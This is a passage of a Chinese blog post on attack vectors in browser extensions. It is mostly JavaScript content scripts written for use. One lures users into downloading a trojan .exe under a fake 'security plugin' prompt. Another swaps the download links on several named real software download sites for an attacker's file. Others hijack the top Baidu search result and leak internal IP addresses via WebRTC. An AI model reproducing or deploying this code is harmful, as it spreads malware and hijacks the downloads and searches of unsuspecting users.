downDateT = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">4</span>].split(<span class="string">":"</span>);  <span class="comment">//时间</span></div><div class="line">    <span class="keyword">if</span>(location.href != <span class="string">"https://baidu.com/"</span>)&#123;  <span class="comment">//当不是百度时，不执行下面的代码</span></div><div class="line">        <span class="keyword">return</span> fasle;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(downDateY == <span class="string">"2016"</span> &amp;&amp; downDateM == <span class="string">"Oct"</span> &amp;&amp; downDateD == <span class="string">"28"</span> &amp;&amp; downDateT[<span class="number">0</span>] == <span class="string">"21"</span> &amp;&amp; downDateT[<span class="number">1</span>] &lt; <span class="string">"30"</span>)&#123;</div><div class="line">        alert(<span class="string">"请下载xxx安全插件保障您在此网站的安全"</span>);</div><div class="line">        location.href = <span class="string">"http://baidu.com/download/xxxx.exe"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p>
<p>真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是<code>https://baidu.com/</code>时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。</p>
<h5 id="0x3-2-使用浏览器漏洞进行攻击"><a href="#0x3-2-使用浏览器漏洞进行攻击" class="headerlink" title="0x3.2 使用浏览器漏洞进行攻击"></a>0x3.2 使用浏览器漏洞进行攻击</h5><p>漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的<code>mxCall</code>函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。</p>
<h5 id="0x3-3-替换下载链接"><a href="#0x3-3-替换下载链接" class="headerlink" title="0x3.3 替换下载链接"></a>0x3.3 替换下载链接</h5><p>替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下：</p>
<blockquote>
<p><a href="http://xiazai.zol.com.cn/" target="_blank" rel="external">ZOL下载-免费软件,绿色软件</a></p>
<p><a href="http://www.skycn.com/" target="_blank" rel="external">天空下载站</a></p>
<p><a href="http://www.onlinedown.net/" target="_blank" rel="external">华军软件园</a></p>
<p><a href="http://www.skycn.net/" target="_blank" rel="external">hao123下载站</a></p>
<p><a href="http://dl.pconline.com.cn/" target="_blank" rel="external">太平洋下载中心</a></p>
<p><a href="http://rj.baidu.com/" target="_blank" rel="external">百度软件中心</a></p>
</blockquote>
<p>还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。<br>先写段代码，让他判断当前的网址是否为下载站<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> downloadWebsite = [</div><div class="line">        <span class="string">'http://xiazai.zol.com.cn'</span>,</div><div class="line">        <span class="string">'http://www.skycn.com'</span>,</div><div class="line">        <span class="string">'http://www.onlinedown.net'</span>,</div><div class="line">        <span class="string">'http://dl.pconline.com.cn'</span>,</div><div class="line">        <span class="string">'http://rj.baidu.com'</span></div><div class="line">    ];  <span class="comment">//要替换的下载站url地址</span></div><div class="line">    <span class="keyword">var</span> replaceDownloadUrl = <span class="string">"http://xxxx.com/download/soft.rar"</span>;   <span class="comment">//要替换的下载软件</span></div><div class="line">    <span class="keyword">switch</span>(location.origin)&#123;  <span class="comment">//对当前的url进判断，是否为下载站，如果是则进入其操作函数里</span></div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">0</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.getElementById(<span class="string">"downloadTop"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".down-alink a"</span>);</div><div class="line">            <span class="keyword">var</span> download3 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".down-alink01 a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1 != <span class="literal">null</span> &amp;&amp; download2.length != <span class="number">0</span> &amp;&amp; download3.length != <span class="number">0</span>)&#123;</div><div class="line">                download1.href = replaceDownloadUrl;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download2.length;j++)&#123;</div><div class="line">                    download2[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>;k &lt; download3.length;k++)&#123;</div><div class="line">                    download3[k].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">1</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".ul_Address li a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download1.length;j++)&#123;</div><div class="line">                    download1[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">2</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".softinfoBox .meg a"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".downDz a"</span>);;</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span> &amp;&amp; download2.length != <span class="number">0</span>)&#123;</div><div class="line">                download1[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download2.length;j++)&#123;</div><div class="line">                    download2[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">3</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".dlLinks-a a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download1.length;j++)&#123;</div><div class="line">                    download1[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">4</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".fast_download"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".normal_download"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span> &amp;&amp; download2.length != <span class="number">0</span>)&#123;</div><div class="line">                download1[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">                download2[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p>
<h5 id="0x3-4-修改百排名"><a href="#0x3-4-修改百排名" class="headerlink" title="0x3.4 修改百排名"></a>0x3.4 修改百排名</h5><p>想做SEO的，可以使用此方法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(location.origin == <span class="string">"https://www.baidu.com"</span> &amp;&amp; location.pathname == <span class="string">"/s"</span>)&#123;    <span class="comment">//当时百度的搜索页面时</span></div><div class="line">        <span class="built_in">document</span>.querySelectorAll(<span class="string">"#content_left h3 a"</span>)[<span class="number">0</span>].href = <span class="string">"http://360.cn/"</span>; <span class="comment">//替换第一个搜索结果为指定的url地址</span></div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p>
<h5 id="0x3-4-内网嗅探"><a href="#0x3-4-内网嗅探" class="headerlink" title="0x3.4 内网嗅探"></a>0x3.4 内网嗅探</h5><p>这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ipList = [];</div><div class="line"><span class="keyword">var</span> webrtcxss = &#123;</div><div class="line">    <span class="attr">webrtc</span>        : <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="keyword">var</span> ip_dups           = &#123;&#125;;</div><div class="line">        <span class="keyword">var</span> RTCPeerConnection = <span class="built_in">window</span>.RTCPeerConnection || <span class="built_in">window</span>.mozRTCPeerConnection || <span class="built_in">window</span>.webkitRTCPeerConnection;</div><div class="line">        <span class="keyword">var</span> mediaConstraints  = &#123;</div><div class="line">            <span class="attr">optional</span>: [&#123;<span class="attr">RtpDataChannels</span>: <span class="literal">true</span>&#125;]</div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">var</span> servers = <span class="literal">undefined</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.webkitRTCPeerConnection)&#123;</div><div class="line">            servers = &#123;<span class="attr">iceServers</span>: []&#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</div><div class="line">        pc.onicecandidate = <span class="function"><span class="keyword">function</span>(<span class="params">ice</span>)</span>&#123;</div><div class="line">            <span class="keyword">if</span>(ice.candidate)&#123;</div><div class="line">                <span class="keyword">var</span> ip_regex        = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span>;</div><div class="line">                <span class="keyword">var</span> ip_addr         = ip_regex.exec(ice.candidate.candidate)[<span class="number">1</span>];</div><div class="line">                <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>)</div><div class="line">                callback(ip_addr);</div><div class="line">                ip_dups[ip_addr]    = <span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        pc.createDataChannel(<span class="string">""</span>);</div><div class="line">        pc.createOffer(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</div><div class="line">            pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</div><div class="line">        &#125;);</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">getIp</span>        : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">this</span>.webrtc(<span class="function"><span class="keyword">function</span>(<span class="params">ip</span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(ip)</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">webrtcxss.getIp();</div></pre></td></tr></table></figure></p>
<p>大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。</p>
<h4 id="0x4-结言："><a href="#0x4-结言：" class="headerlink" title="0x4 结言："></a>0x4 结言：</h4><hr>
<p>还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。</p>
<blockquote>
<p>Author:Black-Hole</p>
<p>Blog：<a href="http://bugs.cc">http://bugs.cc</a></p>
<p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p>
<p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p>
<p>Email:158blackhole@gmail.com</p>
</blockquote>


            
            <div class="post-reward">
                <a id="rewardBtn" href="javascript:;" class="post-reward-btn waves-effect waves-circle waves-light">赏</a>
            </div>
            
            
            <blockquote>
                <p>
                本文地址：
                <a href="http://bugs.cc/2016/10/05/浏览器插件的攻击向量/" target="_blank" rel="external">http://bugs.cc/2016/10/05/浏览器插件的攻击向量/</a>
                </p>
                <footer><cite><a href="http://bugs.cc">@Black-Hole's Blog</a></cite></footer>
            </blockquote>
            </div>
            
<nav class="post-nav">
  
    <div class="waves-block waves-effect prev fl">
      <a href="/2016/12/13/公司wifi安全/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">公司wifi安全</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next fr">
      <a href="/2016/08/24/在debian下如何使用迅雷登陆账号/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">在debian下如何使用迅雷登陆账号</h4>
      </a>
    </div>
  
</nav>


            
            <section id="comments">
  <div id="disqus_thread"></div>
<!-- 来必力City版安装代码 -->
<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ5My84MDU3">
	<script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
   })(document, 'script');
	</script>
<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
</div>
<!-- City版安装代码已完成 -->
  </section>

        </div>
    </div>
</article>

<div id="reward" class="reward-lay">
    <a class="reward-off" id="rewardOff" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢支持
        <i class="icon icon-quote-right"></i>
    </h3>
    <ul class="reward-items">
        
        <li>
            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
            <p>微信</p>
        </li>
        

        
        <li>
            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
            <p>支付宝</p>
        </li>
        
    </ul>
</div>

    </div>
  </main>
<div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>

<script>
var BLOG_SHARE = {
    title: "浏览器插件的攻击向量",
    pic: "/img/logo.jpg",
    summary: document.getElementsByName('summary')[0].content,
    url: "http://bugs.cc/2016/10/05/浏览器插件的攻击向量/index.html"
};
</script>
<div class="global-share" id="global-share">
    <div class="tit">分享到：</div>
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
          豆
        </a>
      </li>
    </ul>
 </div>


<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script src="/js/main.js"></script>



<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<script type="text/template" id="search-tpl">
<li class="item">
    <a href="/{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</script>

<script src="/js/search.js"></script>





<script src="//s95.cnzz.com/z_stat.php?id=1260293515&web_id=1260293515"></script>





</body>
</html>
